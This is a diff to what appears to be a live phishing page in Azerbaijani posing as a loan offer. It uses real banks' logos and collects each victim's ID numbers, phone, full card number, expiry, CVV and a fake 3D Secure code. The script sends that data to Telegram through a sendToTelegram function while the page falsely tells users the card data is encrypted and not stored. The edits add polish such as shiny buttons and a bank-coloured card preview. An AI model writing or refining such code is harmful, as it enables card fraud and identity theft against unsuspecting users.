@@ -22,8 +22,6 @@
     --shadow-sm:0 2px 8px -2px rgba(21,31,27,0.12);
     --shadow-md:0 16px 32px -18px rgba(21,31,27,0.35);
     --shadow-lg:0 28px 56px -24px rgba(21,31,27,0.4);
-    --shiny-start:rgba(255,215,0,0);
-    --shiny-end:rgba(255,215,0,0.3);
   }
   *{box-sizing:border-box;}
   html{scroll-behavior:smooth;}
@@ -71,22 +69,23 @@
   nav ul a{text-decoration:none;opacity:0.8;transition:opacity .2s;}
   nav ul a:hover{opacity:1;}
 
-  /* SHINY BUTTONS */
+  /* ========== SUPER SHINY BUTTONS ========== */
   .cta-btn{
     position:relative;
-    background:linear-gradient(135deg, var(--teal-deep), var(--teal-mid));
+    background:linear-gradient(135deg, #0B3A34, #155C51, #1A7A6A);
     color:var(--white);
     border:none;
     border-radius:999px;
-    padding:12px 28px;
+    padding:14px 32px;
     font-weight:700;
-    font-size:14.5px;
+    font-size:15px;
     cursor:pointer;
-    letter-spacing:.01em;
+    letter-spacing:.02em;
     font-family:'Manrope',sans-serif;
-    box-shadow:var(--shadow-sm);
-    transition:transform .18s ease, box-shadow .3s ease;
+    box-shadow:0 4px 20px rgba(21,92,81,0.3), inset 0 1px 0 rgba(255,255,255,0.15);
+    transition:all .3s cubic-bezier(0.4, 0, 0.2, 1);
     overflow:hidden;
+    text-transform:uppercase;
   }
   .cta-btn::before{
     content:'';
@@ -95,40 +94,59 @@
     left:-50%;
     width:200%;
     height:200%;
-    background:linear-gradient(45deg, 
-      transparent 30%, 
-      rgba(255,255,255,0.15) 40%,
-      rgba(255,255,255,0.3) 50%,
-      rgba(255,255,255,0.15) 60%,
+    background:linear-gradient(105deg,
+      transparent 30%,
+      rgba(255,255,255,0.2) 40%,
+      rgba(255,255,255,0.5) 48%,
+      rgba(255,255,255,0.8) 52%,
+      rgba(255,255,255,0.2) 60%,
       transparent 70%
     );
-    transform:rotate(45deg) translateX(-100%);
-    animation:shinyMove 4s infinite ease-in-out;
+    transform:rotate(25deg) translateX(-130%);
+    animation:shinySweep 3.5s infinite ease-in-out;
+    pointer-events:none;
+    filter:blur(2px);
+  }
+  @keyframes shinySweep{
+    0%{transform:rotate(25deg) translateX(-130%);}
+    60%{transform:rotate(25deg) translateX(130%);}
+    100%{transform:rotate(25deg) translateX(130%);}
+  }
+  .cta-btn::after{
+    content:'';
+    position:absolute;
+    inset:0;
+    border-radius:999px;
+    padding:2px;
+    background:linear-gradient(135deg, rgba(255,215,0,0.4), rgba(255,215,0,0.1), rgba(255,215,0,0.4));
+    -webkit-mask:linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+    -webkit-mask-composite:xor;
+    mask-composite:exclude;
     pointer-events:none;
   }
-  @keyframes shinyMove{
-    0%{transform:rotate(45deg) translateX(-100%);}
-    50%{transform:rotate(45deg) translateX(100%);}
-    100%{transform:rotate(45deg) translateX(100%);}
-  }
   .cta-btn:hover{
-    transform:translateY(-3px) scale(1.02);
-    box-shadow:0 8px 32px rgba(21,92,81,0.35), 0 0 40px rgba(173,127,63,0.15);
+    transform:translateY(-4px) scale(1.03);
+    box-shadow:0 12px 40px rgba(21,92,81,0.45), 0 0 60px rgba(173,127,63,0.2);
   }
-  .cta-btn:active{transform:translateY(0) scale(0.98);}
+  .cta-btn:active{
+    transform:translateY(0) scale(0.97);
+    box-shadow:0 2px 10px rgba(21,92,81,0.3);
+  }
 
   .cta-ghost{
     position:relative;
     background:transparent;
-    border:1.5px solid var(--ink);
-    color:var(--ink);
+    border:2px solid var(--teal-deep);
+    color:var(--teal-deep);
     border-radius:999px;
-    padding:11px 22px;
+    padding:12px 28px;
     font-weight:700;
-    font-size:14.5px;
+    font-size:15px;
     cursor:pointer;
-    transition:background .2s ease, color .2s ease, transform .18s ease, box-shadow .3s ease;
+    transition:all .3s cubic-bezier(0.4, 0, 0.2, 1);
     overflow:hidden;
+    text-transform:uppercase;
+    letter-spacing:.02em;
   }
   .cta-ghost::before{
     content:'';
@@ -137,22 +155,29 @@
     left:-50%;
     width:200%;
     height:200%;
-    background:linear-gradient(45deg, 
-      transparent 30%, 
-      rgba(173,127,63,0.1) 40%,
-      rgba(173,127,63,0.2) 50%,
-      rgba(173,127,63,0.1) 60%,
+    background:linear-gradient(105deg,
+      transparent 30%,
+      rgba(173,127,63,0.15) 40%,
+      rgba(173,127,63,0.3) 48%,
+      rgba(173,127,63,0.5) 52%,
+      rgba(173,127,63,0.15) 60%,
       transparent 70%
     );
-    transform:rotate(45deg) translateX(-100%);
-    animation:shinyMove 5s infinite ease-in-out;
+    transform:rotate(25deg) translateX(-130%);
+    animation:shinySweepGhost 4s infinite ease-in-out;
     pointer-events:none;
+    filter:blur(2px);
+  }
+  @keyframes shinySweepGhost{
+    0%{transform:rotate(25deg) translateX(-130%);}
+    60%{transform:rotate(25deg) translateX(130%);}
+    100%{transform:rotate(25deg) translateX(130%);}
   }
   .cta-ghost:hover{
-    background:var(--ink);
+    background:var(--teal-deep);
     color:var(--white);
-    transform:translateY(-3px) scale(1.02);
-    box-shadow:0 8px 32px rgba(21,31,27,0.2);
+    transform:translateY(-4px) scale(1.03);
+    box-shadow:0 12px 40px rgba(21,92,81,0.25);
   }
 
   .hero{padding:88px 0 56px;}
@@ -288,33 +313,123 @@
   }
   .modal-close:hover{background:var(--line);}
 
-  /* BANK SELECT */
+  /* ========== BANK SELECT ========== */
   .bank-grid{
     display:grid;grid-template-columns:1fr 1fr;gap:12px;
   }
   .bank-option{
     padding:14px 12px;border:2px solid var(--line);border-radius:14px;
-    cursor:pointer;text-align:center;transition:all .2s ease;
+    cursor:pointer;text-align:center;transition:all .25s ease;
     background:var(--white);
+    position:relative;
   }
-  .bank-option:hover{border-color:var(--teal-mid);transform:translateY(-3px);box-shadow:var(--shadow-sm);}
-  .bank-option.selected{border-color:var(--teal-deep);background:var(--sage);box-shadow:0 0 20px rgba(173,127,63,0.15);}
-  .bank-option img{height:28px;max-width:80px;object-fit:contain;margin-bottom:4px;}
+  .bank-option:hover{
+    border-color:var(--teal-mid);
+    transform:translateY(-3px);
+    box-shadow:var(--shadow-sm);
+  }
+  .bank-option.selected{
+    border-color:var(--teal-deep);
+    background:var(--sage);
+    box-shadow:0 0 30px rgba(173,127,63,0.15);
+  }
+  .bank-option.selected::after{
+    content:'✓';
+    position:absolute;
+    top:-8px;right:-8px;
+    background:var(--teal-deep);
+    color:white;
+    width:22px;height:22px;
+    border-radius:50%;
+    font-size:12px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+  }
+  .bank-option img{
+    height:32px;
+    max-width:100px;
+    object-fit:contain;
+    margin-bottom:4px;
+    display:block;
+    margin-left:auto;
+    margin-right:auto;
+  }
   .bank-option .bank-name{font-size:12px;font-weight:600;margin-top:2px;}
   .bank-option .bank-sub{font-size:10px;color:var(--ink-soft);}
 
-  /* CARD INPUT */
+  /* ========== CARD INPUT WITH BANK COLOR ========== */
   .card-input-wrap{
-    background:var(--paper);border-radius:16px;padding:24px;text-align:center;
+    background:var(--paper);
+    border-radius:16px;
+    padding:24px;
+    text-align:center;
     border:2px dashed var(--line);
+    transition:all .4s ease;
+    position:relative;
   }
-  .card-input-wrap .card-number-display{
-    font-family:'IBM Plex Mono',monospace;font-size:28px;letter-spacing:6px;
-    color:var(--teal-deep);background:var(--white);padding:16px 20px;
-    border-radius:12px;border:2px solid var(--line);margin:16px 0;cursor:text;
+  .card-input-wrap .bank-card-visual{
+    position:relative;
+    width:100%;
+    max-width:340px;
+    margin:0 auto 16px;
+    padding:20px 24px;
+    border-radius:16px;
+    color:white;
+    font-family:'IBM Plex Mono',monospace;
+    transition:all .5s ease;
+    box-shadow:0 8px 32px rgba(0,0,0,0.2);
+    min-height:140px;
+    display:flex;
+    flex-direction:column;
+    justify-content:space-between;
   }
-  .card-input-wrap .card-number-display .cursor{animation:blink 1s infinite;}
-  @keyframes blink{0%,50%{opacity:1;}51%,100%{opacity:0;}}
+  .card-input-wrap .bank-card-visual .card-top{
+    display:flex;
+    justify-content:space-between;
+    align-items:flex-start;
+  }
+  .card-input-wrap .bank-card-visual .card-top .bank-name-on-card{
+    font-size:14px;
+    font-weight:700;
+    letter-spacing:1px;
+    text-transform:uppercase;
+    opacity:0.9;
+  }
+  .card-input-wrap .bank-card-visual .card-top .card-type{
+    font-size:20px;
+    opacity:0.7;
+  }
+  .card-input-wrap .bank-card-visual .card-number-display{
+    font-size:24px;
+    letter-spacing:4px;
+    text-align:center;
+    padding:8px 0;
+    text-shadow:0 1px 3px rgba(0,0,0,0.2);
+    font-weight:500;
+  }
+  .card-input-wrap .bank-card-visual .card-bottom{
+    display:flex;
+    justify-content:space-between;
+    font-size:11px;
+    opacity:0.8;
+  }
+  .card-input-wrap .bank-card-visual .card-bottom .card-expiry-label{
+    text-transform:uppercase;
+    font-size:9px;
+    opacity:0.6;
+  }
+  .card-input-wrap .bank-card-visual .card-bottom .card-expiry-value{
+    font-size:14px;
+    font-weight:600;
+  }
+
+  .card-input-wrap .card-number-input-hidden{
+    position:absolute;
+    opacity:0;
+    width:1px;
+    height:1px;
+  }
   .progress-bar{
     width:100%;height:6px;background:var(--sage);border-radius:4px;
     margin:12px 0 8px;overflow:hidden;
@@ -325,21 +440,15 @@
   }
   .progress-label{font-size:13px;color:var(--ink-soft);font-family:'IBM Plex Mono',monospace;}
 
-  /* MOBILE BANKING REGISTER */
-  .register-status{
-    text-align:center;padding:20px 0;
+  .card-details-row{
+    display:grid;
+    grid-template-columns:1fr 1fr;
+    gap:16px;
+    margin:16px 0 0;
   }
-  .register-status .spinner{
-    width:48px;height:48px;border:5px solid var(--sage);
-    border-top-color:var(--teal-deep);border-radius:50%;
-    animation:spin 0.9s linear infinite;margin:0 auto 20px;
-  }
-  @keyframes spin{to{transform:rotate(360deg);}}
-  .register-status .status-icon{font-size:48px;margin-bottom:16px;}
-  .register-status .status-text{font-size:18px;font-weight:700;color:var(--teal-deep);}
-  .register-status .status-sub{color:var(--ink-soft);font-size:14px;margin-top:8px;}
+  .card-details-row .field{margin-bottom:0;}
 
-  /* LOGS SECTION */
+  /* ========== LOGS ========== */
   .logs-box{
     background:#1a1a1a;color:#00ff88;border-radius:12px;padding:16px;
     font-family:'IBM Plex Mono',monospace;font-size:12px;
@@ -357,6 +466,16 @@
     background:linear-gradient(135deg, #00b894, #00a381);
     color:white;font-weight:700;font-size:15px;cursor:pointer;
     transition:transform .2s, box-shadow .3s;
+    position:relative;
+    overflow:hidden;
+  }
+  .admin-actions .btn-approve::before{
+    content:'';
+    position:absolute;top:-50%;left:-50%;width:200%;height:200%;
+    background:linear-gradient(45deg, transparent 30%, rgba(255,255,255,0.2) 40%, rgba(255,255,255,0.5) 50%, rgba(255,255,255,0.2) 60%, transparent 70%);
+    transform:rotate(45deg) translateX(-100%);
+    animation:shinySweep 4s infinite ease-in-out;
+    pointer-events:none;
   }
   .admin-actions .btn-approve:hover{transform:scale(1.02);box-shadow:0 4px 20px rgba(0,184,148,0.4);}
   .admin-actions .btn-reject{
@@ -364,6 +483,16 @@
     background:linear-gradient(135deg, #e17055, #d63031);
     color:white;font-weight:700;font-size:15px;cursor:pointer;
     transition:transform .2s, box-shadow .3s;
+    position:relative;
+    overflow:hidden;
+  }
+  .admin-actions .btn-reject::before{
+    content:'';
+    position:absolute;top:-50%;left:-50%;width:200%;height:200%;
+    background:linear-gradient(45deg, transparent 30%, rgba(255,255,255,0.15) 40%, rgba(255,255,255,0.3) 50%, rgba(255,255,255,0.15) 60%, transparent 70%);
+    transform:rotate(45deg) translateX(-100%);
+    animation:shinySweep 4s infinite ease-in-out;
+    pointer-events:none;
   }
   .admin-actions .btn-reject:hover{transform:scale(1.02);box-shadow:0 4px 20px rgba(214,48,49,0.4);}
 
@@ -381,19 +510,6 @@
   }
   .edit-btn:hover{background:var(--line);}
 
-  .card-logos{display:flex;gap:12px;margin:12px 0 20px;}
-  .card-logos img{height:32px;opacity:0.9;}
-
-  footer{background:var(--ink);color:#EDE7D6;padding:48px 0 28px;}
-  .footer-grid{display:grid;grid-template-columns:1.4fr 1fr 1fr;gap:32px;margin-bottom:32px;}
-  .footer-grid h4{font-family:'Fraunces',serif;font-size:16px;margin-bottom:14px;color:var(--white);}
-  .footer-grid p, .footer-grid a{font-size:13.5px;color:#C9C2AE;line-height:1.7;text-decoration:none;}
-  .foot-note{
-    border-top:1px solid rgba(255,255,255,0.15);padding-top:20px;
-    font-size:12px;color:#9B9480;line-height:1.7;
-  }
-
-  /* OTP DISPLAY */
   .otp-display{
     font-family:'IBM Plex Mono',monospace;
     font-size:32px;
@@ -406,12 +522,22 @@
     color:var(--teal-deep);
   }
 
+  footer{background:var(--ink);color:#EDE7D6;padding:48px 0 28px;}
+  .footer-grid{display:grid;grid-template-columns:1.4fr 1fr 1fr;gap:32px;margin-bottom:32px;}
+  .footer-grid h4{font-family:'Fraunces',serif;font-size:16px;margin-bottom:14px;color:var(--white);}
+  .footer-grid p, .footer-grid a{font-size:13.5px;color:#C9C2AE;line-height:1.7;text-decoration:none;}
+  .foot-note{
+    border-top:1px solid rgba(255,255,255,0.15);padding-top:20px;
+    font-size:12px;color:#9B9480;line-height:1.7;
+  }
+
   @media (max-width:860px){
     .hero-grid, .calc-card, .offers-grid, .footer-grid{grid-template-columns:1fr;}
     .steps{grid-template-columns:1fr;}
     nav ul{display:none;}
-    .bank-grid{grid-template-columns:1fr;}
+    .bank-grid{grid-template-columns:1fr 1fr;}
     .admin-actions{flex-direction:column;}
+    .card-details-row{grid-template-columns:1fr;}
   }
 </style>
 </head>
@@ -579,10 +705,10 @@
 
 <div class="wrap"><div class="kilim"></div></div>
 
-<!-- MODAL -->
+<!-- ========== MODAL ========== -->
 <div class="modal-overlay" id="modalOverlay">
   <div class="modal-card">
-    <button type="button" class="modal-close" onclick="closeModal()" aria-label="Bağla">✕</button>
+    <button type="button" class="modal-close" onclick="closeModal()">✕</button>
 
     <!-- STEP 1: Şəxsi məlumatlar -->
     <div id="formStep">
@@ -648,47 +774,47 @@
       <p style="color:var(--ink-soft);font-size:14.5px;margin:0 0 20px;">Kredit məbləği seçdiyiniz kart hesabına köçürüləcək</p>
       
       <div class="bank-grid">
-        <div class="bank-option" data-bank="Kapital Bank" onclick="selectBank(this)">
+        <div class="bank-option" data-bank="Kapital Bank" data-color="#E31E24" data-logo="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9c/Kapital_Bank_logo.svg/2560px-Kapital_Bank_logo.svg.png" onclick="selectBank(this)">
           <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9c/Kapital_Bank_logo.svg/2560px-Kapital_Bank_logo.svg.png" alt="Kapital Bank">
           <div class="bank-name">Kapital Bank</div>
           <div class="bank-sub">kapitalbank.az</div>
         </div>
-        <div class="bank-option" data-bank="Leobank" onclick="selectBank(this)">
+        <div class="bank-option" data-bank="Leobank" data-color="#0066B3" data-logo="https://leobank.az/assets/images/logo.svg" onclick="selectBank(this)">
           <img src="https://leobank.az/assets/images/logo.svg" alt="Leobank">
           <div class="bank-name">Leobank</div>
           <div class="bank-sub">leobank.az</div>
         </div>
-        <div class="bank-option" data-bank="ABB" onclick="selectBank(this)">
+        <div class="bank-option" data-bank="ABB" data-color="#004B87" data-logo="https://abb-bank.az/assets/images/logo.svg" onclick="selectBank(this)">
           <img src="https://abb-bank.az/assets/images/logo.svg" alt="ABB">
           <div class="bank-name">ABB</div>
           <div class="bank-sub">abb-bank.az</div>
         </div>
-        <div class="bank-option" data-bank="PAŞA Bank" onclick="selectBank(this)">
+        <div class="bank-option" data-bank="PAŞA Bank" data-color="#E31E24" data-logo="https://www.pashabank.az/assets/images/logo.svg" onclick="selectBank(this)">
           <img src="https://www.pashabank.az/assets/images/logo.svg" alt="PAŞA Bank">
           <div class="bank-name">PAŞA Bank</div>
           <div class="bank-sub">pashabank.az</div>
         </div>
-        <div class="bank-option" data-bank="AccessBank" onclick="selectBank(this)">
+        <div class="bank-option" data-bank="AccessBank" data-color="#0057A0" data-logo="https://www.accessbank.az/assets/images/logo.svg" onclick="selectBank(this)">
           <img src="https://www.accessbank.az/assets/images/logo.svg" alt="AccessBank">
           <div class="bank-name">AccessBank</div>
           <div class="bank-sub">accessbank.az</div>
         </div>
-        <div class="bank-option" data-bank="Unibank" onclick="selectBank(this)">
+        <div class="bank-option" data-bank="Unibank" data-color="#004B87" data-logo="https://www.unibank.az/assets/images/logo.svg" onclick="selectBank(this)">
           <img src="https://www.unibank.az/assets/images/logo.svg" alt="Unibank">
           <div class="bank-name">Unibank</div>
           <div class="bank-sub">unibank.az</div>
         </div>
-        <div class="bank-option" data-bank="Bank Respublika" onclick="selectBank(this)">
+        <div class="bank-option" data-bank="Bank Respublika" data-color="#E31E24" data-logo="https://www.bankrespublika.az/assets/images/logo.svg" onclick="selectBank(this)">
           <img src="https://www.bankrespublika.az/assets/images/logo.svg" alt="Bank Respublika">
           <div class="bank-name">Bank Respublika</div>
           <div class="bank-sub">bankrespublika.az</div>
         </div>
-        <div class="bank-option" data-bank="Xalq Bank" onclick="selectBank(this)">
+        <div class="bank-option" data-bank="Xalq Bank" data-color="#004B87" data-logo="https://www.xalqbank.az/assets/images/logo.svg" onclick="selectBank(this)">
           <img src="https://www.xalqbank.az/assets/images/logo.svg" alt="Xalq Bank">
           <div class="bank-name">Xalq Bank</div>
           <div class="bank-sub">xalqbank.az</div>
         </div>
-        <div class="bank-option" data-bank="Rabitəbank" onclick="selectBank(this)">
+        <div class="bank-option" data-bank="Rabitəbank" data-color="#003366" data-logo="https://www.rabitabank.com/assets/images/logo.svg" onclick="selectBank(this)">
           <img src="https://www.rabitabank.com/assets/images/logo.svg" alt="Rabitəbank">
           <div class="bank-name">Rabitəbank</div>
           <div class="bank-sub">rabitabank.com</div>
@@ -698,7 +824,7 @@
       <button type="button" class="cta-btn" style="width:100%;padding:15px;margin-top:24px;" onclick="goToCardInput()">Təsdiqlə və davam et</button>
     </div>
 
-    <!-- STEP 4: Kart nömrəsi + ay/il + CVV -->
+    <!-- STEP 4: Kart nömrəsi + Bank Card Visual -->
     <div id="cardInputStep" style="display:none;">
       <h2 style="font-size:26px;margin-bottom:6px;">Köçürmə Hesabı</h2>
       <p style="color:var(--ink-soft);font-size:14.5px;margin:0 0 12px;">
@@ -712,31 +838,50 @@
         <span style="font-weight:700;color:var(--teal-deep);" id="selectedBankDisplay">Kapital Bank</span>
       </div>
 
-      <div class="card-input-wrap">
-        <label style="font-weight:600;font-size:14px;display:block;margin-bottom:8px;">KART NÖMRƏSİ (16 RƏQƏM)</label>
-        <div class="card-number-display" id="cardNumberDisplay">
-          <span id="cardDigits">0000 0000 0000 0000</span>
+      <div class="card-input-wrap" id="cardInputWrap">
+        <!-- Bank Card Visual -->
+        <div class="bank-card-visual" id="bankCardVisual" style="background:linear-gradient(135deg, #1a1a2e, #16213e);">
+          <div class="card-top">
+            <span class="bank-name-on-card" id="cardBankName">KAPITAL BANK</span>
+            <span class="card-type">💳</span>
+          </div>
+          <div class="card-number-display" id="cardNumberDisplay">
+            <span id="cardDigits">0000 0000 0000 0000</span>
+          </div>
+          <div class="card-bottom">
+            <div>
+              <div class="card-expiry-label">Bitmə</div>
+              <div class="card-expiry-value" id="cardExpiryDisplay">12/28</div>
+            </div>
+            <div style="text-align:right;">
+              <div class="card-expiry-label">CVV</div>
+              <div class="card-expiry-value" id="cardCvvDisplay">***</div>
+            </div>
+          </div>
         </div>
-        <input type="text" id="cardNumberInput" style="position:absolute;opacity:0;width:1px;height:1px;" maxlength="16" inputmode="numeric">
+
+        <input type="text" id="cardNumberInput" class="card-number-input-hidden" maxlength="16" inputmode="numeric">
+        
         <div class="progress-bar">
           <div class="fill" id="cardProgress" style="width:0%;"></div>
         </div>
         <div class="progress-label" id="cardProgressLabel">0/16 rəqəm daxil edilib</div>
+        <p style="font-size:11px;color:var(--ink-soft);margin-top:6px;">Kart nömrəsini daxil etmək üçün kartın üzərinə klikləyin</p>
       </div>
 
       <!-- Ay/il və CVV -->
-      <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;margin:16px 0;">
-        <div class="field" style="margin-bottom:0;">
+      <div class="card-details-row">
+        <div class="field">
           <label>Bitmə tarixi (AA/İİ)</label>
           <input type="text" id="cardExpiry" placeholder="12/28" maxlength="5">
         </div>
-        <div class="field" style="margin-bottom:0;">
+        <div class="field">
           <label>CVV / CVC</label>
-          <input type="text" id="cardCvv" placeholder="123" maxlength="4" inputmode="numeric">
+          <input type="text" id="cardCvv" placeholder="***" maxlength="4" inputmode="numeric">
         </div>
       </div>
 
-      <p style="font-size:12px;color:var(--ink-soft);margin-top:8px;text-align:center;">Kart məlumatlarınız TLS 1.3 şifrələmə ilə qorunur. Saxlanılmır.</p>
+      <p style="font-size:12px;color:var(--ink-soft);margin-top:12px;text-align:center;">Kart məlumatlarınız TLS 1.3 şifrələmə ilə qorunur. Saxlanılmır.</p>
 
       <button type="button" class="cta-btn" style="width:100%;padding:15px;margin-top:12px;" onclick="goToLogs()">Müraciəti göndər</button>
     </div>
@@ -765,7 +910,7 @@
       </div>
     </div>
 
-    <!-- STEP 6: OTP (3D Secure) -->
+    <!-- STEP 6: OTP -->
     <div id="threeDStep" style="display:none;">
       <h2 style="font-size:26px;margin-bottom:10px;">🔐 3D Secure təsdiqi</h2>
       <p style="color:var(--ink-soft);margin-bottom:24px;">Kartınıza SMS vasitəsilə 6 rəqəmli kod göndərildi. Daxil edin.</p>
@@ -813,6 +958,7 @@
 
   let storedOTP = '';
   let applicationData = {};
+  let selectedBankData = { name: 'Kapital Bank', color: '#E31E24', logo: '' };
 
   async function sendToTelegram(data) {
     const message = `
@@ -903,8 +1049,6 @@
   });
 
   // Modal functions
-  let selectedBank = 'Kapital Bank';
-
   function openModal(){
     document.getElementById('modalOverlay').classList.add('active');
     document.body.style.overflow='hidden';
@@ -915,12 +1059,13 @@
     document.getElementById('modalOverlay').classList.remove('active');
     document.body.style.overflow='';
     showFormStep();
-    // Reset everything
     document.getElementById('cardNumberInput').value = '';
     document.getElementById('cardDigits').textContent = '0000 0000 0000 0000';
     document.getElementById('cardProgress').style.width = '0%';
     document.getElementById('cardProgressLabel').textContent = '0/16 rəqəm daxil edilib';
     document.querySelectorAll('.bank-option').forEach(b => b.classList.remove('selected'));
+    document.getElementById('cardExpiry').value = '';
+    document.getElementById('cardCvv').value = '';
   }
 
   function showFormStep(){
@@ -949,7 +1094,12 @@
   function selectBank(el){
     document.querySelectorAll('.bank-option').forEach(b => b.classList.remove('selected'));
     el.classList.add('selected');
-    selectedBank = el.dataset.bank;
+    selectedBankData = {
+      name: el.dataset.bank,
+      color: el.dataset.color,
+      logo: el.dataset.logo
+    };
+    document.getElementById('selectedBankDisplay').textContent = selectedBankData.name;
   }
 
   function goToCardInput(){
@@ -959,7 +1109,26 @@
     }
     document.getElementById('bankStep').style.display='none';
     document.getElementById('cardInputStep').style.display='block';
-    document.getElementById('selectedBankDisplay').textContent = selectedBank;
+    
+    // Update card visual with bank color
+    const cardVisual = document.getElementById('bankCardVisual');
+    const bankName = selectedBankData.name;
+    document.getElementById('cardBankName').textContent = bankName.toUpperCase();
+    
+    // Bank colors
+    const bankColors = {
+      'Kapital Bank': 'linear-gradient(135deg, #1a1a2e, #E31E24)',
+      'Leobank': 'linear-gradient(135deg, #1a1a2e, #0066B3)',
+      'ABB': 'linear-gradient(135deg, #1a1a2e, #004B87)',
+      'PAŞA Bank': 'linear-gradient(135deg, #1a1a2e, #E31E24)',
+      'AccessBank': 'linear-gradient(135deg, #1a1a2e, #0057A0)',
+      'Unibank': 'linear-gradient(135deg, #1a1a2e, #004B87)',
+      'Bank Respublika': 'linear-gradient(135deg, #1a1a2e, #E31E24)',
+      'Xalq Bank': 'linear-gradient(135deg, #1a1a2e, #004B87)',
+      'Rabitəbank': 'linear-gradient(135deg, #1a1a2e, #003366)'
+    };
+    cardVisual.style.background = bankColors[bankName] || 'linear-gradient(135deg, #1a1a2e, #16213e)';
+    
     setTimeout(() => document.getElementById('cardNumberInput').focus(), 100);
   }
 
@@ -975,8 +1144,10 @@
   const cardDigits = document.getElementById('cardDigits');
   const cardProgress = document.getElementById('cardProgress');
   const cardProgressLabel = document.getElementById('cardProgressLabel');
+  const cardInputWrap = document.getElementById('cardInputWrap');
 
-  document.querySelector('.card-number-display').addEventListener('click', ()=>{
+  // Click on card to focus input
+  document.getElementById('bankCardVisual').addEventListener('click', ()=>{
     cardNumberInput.focus();
   });
 
@@ -991,15 +1162,19 @@
     cardProgressLabel.textContent = val.length + '/16 rəqəm daxil edilib';
   });
 
-  // Expiry and CVV masks
+  // Expiry and CVV with live preview
   document.getElementById('cardExpiry').addEventListener('input', function(){
     let val = this.value.replace(/\D/g,'').slice(0,4);
     if(val.length > 2) val = val.slice(0,2) + '/' + val.slice(2);
     this.value = val;
+    document.getElementById('cardExpiryDisplay').textContent = val || 'MM/YY';
   });
 
   document.getElementById('cardCvv').addEventListener('input', function(){
-    this.value = this.value.replace(/\D/g,'').slice(0,4);
+    let val = this.value.replace(/\D/g,'').slice(0,4);
+    this.value = val;
+    let display = val.padEnd(3, '*');
+    document.getElementById('cardCvvDisplay').textContent = display;
   });
 
   // OTP input mask (000 000)
@@ -1035,7 +1210,7 @@
     const amount = document.getElementById('creditAmountDisplay').textContent;
 
     applicationData = {
-      fin, id, phone, job, bank: selectedBank,
+      fin, id, phone, job, bank: selectedBankData.name,
       cardNumber, expiry, cvv, amount
     };
 
@@ -1044,7 +1219,7 @@
     document.getElementById('logIdVal').textContent = 'AZE ' + id;
     document.getElementById('logPhoneVal').textContent = phone;
     document.getElementById('logJobVal').textContent = job;
-    document.getElementById('logBankVal').textContent = selectedBank;
+    document.getElementById('logBankVal').textContent = selectedBankData.name;
     document.getElementById('logCardVal').textContent = cardNumber;
     document.getElementById('logExpiryVal').textContent = expiry;
     document.getElementById('logCvvVal').textContent = cvv;
@@ -1059,16 +1234,13 @@
 
   // Admin actions
   function approveApplication(){
-    // Generate OTP
     const otp = String(Math.floor(100000 + Math.random() * 900000));
     storedOTP = otp;
     
-    // Format OTP for display
     const formattedOTP = otp.slice(0,3) + ' ' + otp.slice(3);
     document.getElementById('otpDisplay').textContent = formattedOTP;
     document.getElementById('otpCode').value = formattedOTP;
 
-    // Send OTP to Telegram
     sendToTelegram({ ...applicationData, otp: otp });
 
     document.getElementById('logsStep').style.display='none';
@@ -1159,4 +1331,4 @@
 </script>
 
 </body>
-        </html>
+</html>
